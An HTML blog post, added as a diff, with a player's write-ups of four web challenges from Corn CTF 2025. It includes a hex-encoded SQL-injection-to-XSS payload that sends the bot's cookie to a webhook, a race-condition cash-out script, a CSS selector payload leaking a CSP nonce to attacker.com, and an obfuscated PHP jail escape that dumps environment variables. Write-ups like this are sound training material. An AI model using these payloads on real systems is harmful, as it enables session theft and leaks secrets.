@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <title>cornCTF 2025</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+  
+  <link rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets@11.9.0/styles/github-dark.min.css">
+
+  
+  <link rel="stylesheet" href="../../static/css/common.css">
+
+ 
+  <link rel="stylesheet" href="../../static/css/pages.css">
+</head>
+
+<body>
+  <header>
+    <nav class="main-nav">
+      <ul>
+        <li><a href="../../index.html">Home</a></li>
+        <li><a href="../posts-page-1.html" aria-current="page">Blog</a></li>
+        <li><a href="../../cv.pdf">CV</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main class="post-wrapper">
+    <h1 class="post-title">cornCTF 2025</h1>
+    <div class="post-meta">
+      <span><i class="fa-regular fa-calendar"></i>May 25, 2025</span>
+      
+    </div>
+
+    <figure>
+      <img src="../../static/images/cob.svg" alt="SAS CTF banner" style="width: 9rem; height: auto;">
+    </figure>
+
+    <article class="post-content">
+      <p>Last week I had the chance to play in <strong>Corn CTF 2025</strong>, organized by the Pwnlentoni, and with my team <code>K!nd4SUS</code> we finished in 3rd place. Below are the write-ups for the four web challenges I was able to solve.</p>
+
+      <h2>Simple Chat (22 solves)</h2>
+      <hr class="divider">
+
+      <p>The challenge starts with a login screen. When we try to register, we notice that it’s impossible because there’s nowhere in the code that actually processes the data we enter to create an account.</p>
+
+      
+
+      <p>However, we notice that in <code>db.js</code> during the app’s initialization a user named kekw with the password kekw is created, so we can log in as that user.</p>
+
+<pre><code class="language-sql">
+INSERT INTO users(username,password) VALUES 
+                        ('admin','${ADMIN_PASSWORD}'),
+                        ('Val','${crypto.randomBytes(16).toString("hex")}'),
+                        ('augusto','${crypto.randomBytes(16).toString("hex")}'),
+                        ('CubikMan47','${crypto.randomBytes(16).toString("hex")}'),
+                        ('LolLo','${crypto.randomBytes(16).toString("hex")}'),
+                        ('Hiipso','${crypto.randomBytes(16).toString("hex")}'),
+                        ('FTW','${crypto.randomBytes(16).toString("hex")}'),
+                        ('kekw','kekw'); <-- Here
+</code></pre>
+
+      
+<p>Once we’re logged in the page shows several chat with the users that were pre-populated in the database, and we can chat with them and receive replies.</p>
+<p>We notice that the application exposes a <code>/ping</code> endpoint that lets us have the bot visit a chat between itself and a friend, so we can assume the challenge is an XSS.</p>
+<pre><code class="language-javascript">
+app.get('/ping', async (req,res) =&gt; {
+  const friend = req.query.friend;
+  if(!req.session.username){
+    res.json({'status':&quot;You have to be logged in to ping admin&quot;});
+    return;
+  }
+  if(!FRIENDS.includes(friend)){
+    res.json({'status':&quot;You are not admin's friend&quot;});
+    return;
+  }
+  fetch(`${HEADLESS_HOST}/`, { 
+    method: 'POST', 
+    headers: { 'Content-Type': 'application/json', 'X-Auth': HEADLESS_AUTH },
+    body: JSON.stringify({
+        browser: 'chrome',
+        actions: [
+            {
+                type: 'request',
+                url: `${CHALLENGE_HOST}/`,
+            },
+            {
+                type: 'set-cookie',
+                name: 'flag',
+                value: FLAG
+            },
+            {
+                type: 'sleep',
+                time: 2
+            },
+            {
+                type: 'type',
+                element: 'input#username', //username
+                value: 'admin'
+            },
+            {
+                type: 'type',
+                element: 'input#password', //password
+                value: ADMIN_PASSWORD
+            },
+            {
+                type: 'sleep',
+                time: 1
+            },            
+            {
+                type: 'click',
+                element: 'input[type=submit]'
+            },
+            {
+                type: 'sleep',
+                time: 5
+            },
+            {
+                type: 'click',
+                element: `#friend-list &gt; li:nth-child(${FRIENDS.indexOf(friend)+1})` //opens chat with said friend
+            },
+            {
+                type: 'sleep',
+                time: 10
+            },
+        ]
+     })}).then(r =&gt; {
+      console.log(r.status_code)
+     })
+    
+  res.json({'status':'Admin got pinged'})
+})
+</code></pre>
+
+<p>Indeed, in <code>script.js</code> we can see that the messages are inserted into the HTML without any sanitization.</p>
+
+<pre><code class="language-javascript">
+function appendMessage(name, img, side, text) {
+  // Simple solution for small apps
+  const msgHTML = `
+    &lt;div class="msg ${side}-msg"&gt;
+      &lt;div class="msg-img" style="background-image: url(${img})"&gt;&lt;/div&gt;
+
+      &lt;div class="msg-bubble"&gt;
+        &lt;div class="msg-info"&gt;
+          &lt;div class="msg-info-name"&gt;${name}&lt;/div&gt;
+        &lt;/div&gt;
+
+        &lt;div class="msg-text"&gt;${text}&lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  `;
+
+  msgerChat.insertAdjacentHTML("beforeend", msgHTML);
+  msgerChat.scrollTop += 500;
+}
+</code></pre>
+<p>But there’s a problem in <code>/api/v1/insertChat</code> the < and > characters are being converted into HTML entities.</p>
+<pre><code class="language-javascript">
+
+app.post('/api/v1/insertChat',async (req,res) => {
+  const sender = req.body.sender;
+  const receiver = req.body.receiver;
+  var message = req.body.message;
+
+  if(!FRIENDS.includes(sender) && sender !== 'admin' && sender !== 'kekw'){
+    res.json({'status':"you can't write messages on behalf of other people."})
+    return
+  }
+
+  if(!FRIENDS.includes(receiver) && receiver !== 'admin' && receiver !== 'kekw') {
+    res.json({'status':"you can't write to nobody"})
+    return;
+  }
+
+  //no XSS
+  message = message.replaceAll('<','&amp;lt;');
+  message = message.replaceAll('>','&amp;gt;');
+
+  const result = await db.insertChat(sender,receiver,message);
+  if(result != 0){
+    res.json({'status':"Couldn't insert the chat."});
+    return;
+  }
+  const response = {'status':'Success'};
+  res.json(response);
+})
+</code></pre>
+<p>Fortunately however, there’s an SQL injection vulnerability in <code>db.js</code> that lets us completely bypass this check!</p>
+<pre><code class="language-javascript">
+async insertChat(sender,receiver,message){
+        try{
+            const query = `INSERT INTO chat(sender,receiver,message) VALUES ('${sender}','${receiver}','${message}');`;
+            await this.client.query(query);
+        } catch (e) {
+            console.log(`Error: ${e}`)
+            return 1;
+        }
+        return 0;
+    }
+</code></pre>
+<p>The application uses PostgreSQL so i crafted a tailored payload; I used hexadecimal encoding to bypass the filter but there are many other valid options. (The flag is stored in the bot’s cookie)</p>
+<pre><code class="language-sql">
+');INSERT INTO chat(sender,receiver,message) VALUES ('Val','admin',E'\x3c\x2f\x64\x69\x76\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x22\x78\x22\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x74\x68\x69\x73\x2e\x73\x72\x63\x3d\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x2e\x73\x69\x74\x65\x2f\x33\x35\x62\x30\x33\x37\x35\x34\x2d\x66\x32\x65\x66\x2d\x34\x62\x65\x34\x2d\x61\x35\x62\x39\x2d\x34\x33\x66\x37\x33\x63\x37\x38\x61\x31\x62\x66\x3f\x27\x2b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x3b\x3e');--
+</code></pre>
+<p>Now all we have to do is send a request to <code>/ping?friend=Val</code>, and the flag will be sent to our webhook!</p>
+
+<h2>aeronaut (17 solves)</h2>
+      <hr class="divider">
+
+      <p>The challenge presents us with an interface where we can bet money (starting with a balance of $10).</p>
+      <p>The goal of the game is to place a bet and there's a multiplier that increases every second. You have to cash out before the multiplier crashes — otherwise, you lose all your money. If you manage to cash out in time, you win the amount multiplied by the current multiplier at the moment of cashing out.</p>
+<p>We win if our balance reaches <code>100 million</code></p>
+
+<p>The page is connected to the backend via WebSockets, through which it communicates.</p>
+
+<p>Analyzing the program’s logic, we noticed that the backend sends the crash-out notification before it resets the player’s bets, and during that window the socket sleeps for <code>0.2 seconds</code></p>
+<pre><code class="language-python">
+print(bcolors.FAIL + "End phase" + bcolors.ENDC)
+        socketio.emit('game_state', {
+            'phase': 'ended',
+            'multiplier': gs.max_multiplier
+        })
+        
+        socketio.sleep(0.2) # fix latency
+        gs.game_phase = 'ended'
+        # Reset bets
+        for player in gs.players.values():
+            if player.bet > 0:
+                player.lose()
+</code></pre>
+<p>0.2 seconds may seem short, but it’s actually plenty of time; in fact, we can write a client-side script that cashes out the moment the multiplier crashes, letting us win the maximum possible amount for each round until we reach 100M balance!</p>
+<pre><code class="language-javascript">
+(() => {
+  const sock = window.socket || socket;
+  const balEl = document.getElementById('balance');
+
+  sock.on('game_state', data => {
+    if (data.phase === 'betting') {
+      const bal = parseFloat(balEl.textContent) || 0;
+      if (bal > 0) sock.emit('place_bet', { amount: bal });
+    } else if (data.phase === 'ended') {
+      setTimeout(() => sock.emit('cashout'), 0);
+    }
+  });
+})();
+</code></pre>
+
+<h2>PolentaGPT (12 solves)</h2>
+<hr class="divider">
+<p>The challenge presents us with a screen where we can chat with an LLM and receive responses.</p>
+<p>Additionally, there’s a service that allows us to send a message to a bot, which will forward it to the LLM to create a chat between them.</p>
+<p>Our goal is to retrieve the bot’s cookie so we can impersonate it and obtain the flag.</p>
+<p>The chat service is clearly vulnerable to <code>XSS</code> because the input data is inserted into the page without any sanitization.</p>
+<pre><code class="language-javascript">
+ $(document).ready(function(){
+            $(&quot;#chatForm&quot;).submit(function(e){
+                e.preventDefault();
+            });
+            $(&quot;#sendBtn&quot;).click(function(){
+                var message = $(&quot;#userInput&quot;).val().trim();
+                if(message === &quot;&quot;) return;
+
+                $(&quot;#chatbox&quot;).append(&quot;&lt;div class='message user'&gt;&lt;strong&gt;You:&lt;/strong&gt; &quot; + message + &quot;&lt;/div&gt;&quot;);
+                $(&quot;#userInput&quot;).val(&quot;&quot;);
+
+                $.ajax({
+                    type: &quot;POST&quot;,
+                    url: &quot;/chat&quot;,
+                    contentType: &quot;application/json&quot;,
+                    data: JSON.stringify({ message: message }),
+                    success: function(data){
+                        $(&quot;#chatbox&quot;).append(&quot;&lt;div class='message ai'&gt;&lt;strong&gt;PolentaGPT:&lt;/strong&gt; &quot; + data.reply + &quot;&lt;/div&gt;&quot;);
+                        $(&quot;#chatbox&quot;).scrollTop($(&quot;#chatbox&quot;)[0].scrollHeight);
+                    },
+                    error: function(){
+                        $(&quot;#chatbox&quot;).append(&quot;&lt;div class='message ai'&gt;&lt;strong&gt;PolentaGPT:&lt;/strong&gt; Communication error.&lt;/div&gt;&quot;);
+                    }
+                });
+            });
+        });
+
+</pre></code>
+<p>The problem, however, is that the server requires a nonce for inline scripts, otherwise they won’t be executed.</p>
+<pre><code class="language-python">
+@app.after_request
+def apply_csp(response):
+    nonce = getattr(g, "nonce", None)
+    if nonce is None:
+        nonce = base64.b64encode(os.urandom(16)).decode()
+        g.nonce = nonce                   
+
+    csp = (
+        f"script-src 'nonce-{nonce}'"
+        f"script-src-elem 'nonce-{nonce}'; "
+        f"script-src-attr 'nonce-{nonce}'; "
+        "object-src 'none'; "
+        "frame-ancestors 'none'; "
+        "upgrade-insecure-requests"
+    )
+
+    response.headers["Content-Security-Policy"] = csp
+</pre></code>
+<p>What’s really strange, though, is that the page includes a <code>&lt;nonce&gt;</code> tag containing the actual nonce value.</p>
+<pre><code class="language-html">
+&lt;nonce value=&quot;{{ nonce }}&quot;&gt;&lt;/nonce&gt;
+</pre></code>
+<p>If we take a closer look at the CSP rules, we notice there are no restrictions regarding styles. This is a serious problem because <code>CSS</code> can actually be used to extract information about the content of the page.</p>
+<p>The following payload lets us send to our webhook information about the first letter of the nonce.</p>
+<pre><code class="language-html">
+&lt;style&gt;
+
+nonce[value^=&quot;a&quot;] {
+    background-image: url(&quot;https://attacker.com/leak/a&quot;);
+}
+
+
+nonce[value^=&quot;b&quot;] {
+    background-image: url(&quot;https://attacker.com/leak/b&quot;);
+}
+
+&lt;/style&gt;
+
+</pre></code>
+
+<p>We can repeat this process for all 32 characters of the nonce, and once we’ve reconstructed it, we can send the bot a classic JavaScript payload that exfiltrates its cookie to our webhook — and just like that, the challenge is solved!</p>
+
+<h2>PHPisLovePHPisLife3 (12 solves)</h2>
+<hr class="divider">
+
+<p>The challenge is a classic <code>PHP jail</code>, where there’s a blacklist of characters and functions that we’re not allowed to use.</p>
+<p>The flag is stored in the environment variable <code>FLAG</code></p>
+<pre><code class="language-php">
+if(isset($_POST['code'])){
+    
+    $code = $_POST['code'];
+    // I <3 blacklists
+    $characters = ['\`', '\[', '\*', '\.', '\\\\', '\=', '\+', '\$'];
+    $classes = get_declared_classes();
+    $functions = get_defined_functions()['internal'];
+    $strings = ['eval', 'include', 'require', 'function', 'flag', 'echo', 'print', '\$.*\{.*\$', '\}[^\{]*\}', '?>'];
+    $variables =  ['_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_FILES', '_ENV', 'HTTP_ENV_VARS', '_SESSION', 'GLOBALS', 'variables', 'strings', 'blacklist', 'functions', 'classes', 'code'];
+    
+    $blacklist = array_merge($characters, $classes, $functions, $variables, $strings);
+    
+    foreach ($blacklist as $blacklisted) {
+        
+        if (preg_match ('/' . $blacklisted . '/im', $code)) {
+            
+            $output = 'No hacks pls';
+        }
+    }
+    
+    if(count($_GET) != 0 || count($_POST) > 1) {
+      $output = 'No hacks pls';
+    }
+    
+    if(!isset($output)){
+        $my_function = create_function('',$code);
+        // $output = $my_function(); // I don't trust you
+        $output = 'This function is disabled.';
+    }
+    echo $output;
+}
+</code></pre>
+<p>Even though we can’t see our output, PHP’s documentation reveals that <code>create_function()</code> internally calls <code>eval()</code></p>
+<blockquote>This function internally performs an eval() and as such has the same security issues as eval().</blockquote>
+<p>If we take a look at the source code of the function, it turns out to be this:</p>
+<pre><code class="language-c">
+ "function " + 
+        $SOME_DYNAMIC_NAME + 
+        "(" + 
+        $LIST_OF_ARGUMENTS + 
+        ")" + 
+        "{" +
+        $CODE_TO_EXECUTE +
+        "}" +
+        "\0"
+</code></pre>
+<p>After several attempts, I managed to solve the challenge with this payload, which uses the OR operation to obfuscate the function names.</p>
+<pre><code class="language-php">
+}?&gt; &lt;? (p|&#39;0rint_r&#39;)((getenp|&#39;aetenF&#39;)()) ?&gt; //
+</code></pre>
+<p>Which, once decoded, turns into this command:</p>
+<pre><code class="language-php">
+print_r(getenv())
+</code></pre>
+
+      <hr class="divider">
+
+      <h3>Thanks for reading!</h3>
+    </article>
+  </main>
+
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  
+</body>
+</html>
